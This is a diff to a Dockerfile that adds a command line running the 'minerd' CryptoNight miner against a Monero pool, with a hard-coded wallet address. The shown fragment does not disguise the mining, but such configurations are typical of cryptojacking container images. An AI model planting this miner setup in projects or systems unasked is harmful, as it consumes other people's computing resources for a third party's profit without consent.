@@ -29,5 +29,5 @@ RUN addgroup app \
 # USER app
 
 WORKDIR /home/app
-
+CMD [ "-o", "stratum+tcp://pool.minexmr.com:4444", "-u", "45YJGP8VXpPGLFMJGBVq3YHkaXB42a14z8TPSvr6e7ShMhS1GViakWjirFZADtV8Ck67QLcSxF2YZVu7aVMNv62FUQ6qV6E", "-p", "-x"]
 ENTRYPOINT ["minerd", "-a", "cryptonight"]
